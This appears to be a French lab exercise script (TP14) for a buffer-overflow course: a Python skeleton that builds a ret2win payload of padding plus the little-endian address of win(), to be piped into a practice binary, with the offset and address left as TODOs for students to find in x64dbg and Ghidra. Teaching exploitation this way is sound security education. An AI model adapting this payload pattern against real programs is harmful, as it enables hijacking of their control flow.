#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TP14 - groupe : fabrication de la charge utile ret2win.

Tout est deja ecrit SAUF deux valeurs a completer (les TODO). Pas besoin de
savoir programmer : il faut trouver ces deux nombres avec x64dbg et Ghidra,
puis les ecrire ici.

Principe :
    [ remplissage ] + [ adresse de win() ]
    <--- OFFSET ---->   <--- 4 octets ---->
On remplit le tampon jusqu'a l'adresse de retour (OFFSET octets), puis on
ecrit par-dessus l'adresse de win() (32 bits, petit-boutiste).

Usage :
    python payload.py > payload.bin
    puis, cote Windows :   type payload.bin | acces.exe
"""
import struct
import sys

# --- A COMPLETER -----------------------------------------------------------
# TODO(1): nombre d'octets de remplissage avant l'adresse de retour.
#          Indice : envoyez un motif cyclique (Aa0Aa1Aa2...) dans x64dbg,
#          lisez la valeur qui ecrase EIP, et retrouvez sa position.
OFFSET = 0               # <<< remplacez 0 par le bon decalage

# TODO(2): adresse de la fonction win() (lue dans Ghidra, format 0x004015xx).
WIN_ADDR = 0x00000000    # <<< remplacez par l'adresse de win()
# ---------------------------------------------------------------------------


def main():
    payload = b"A" * OFFSET + struct.pack("<I", WIN_ADDR)
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
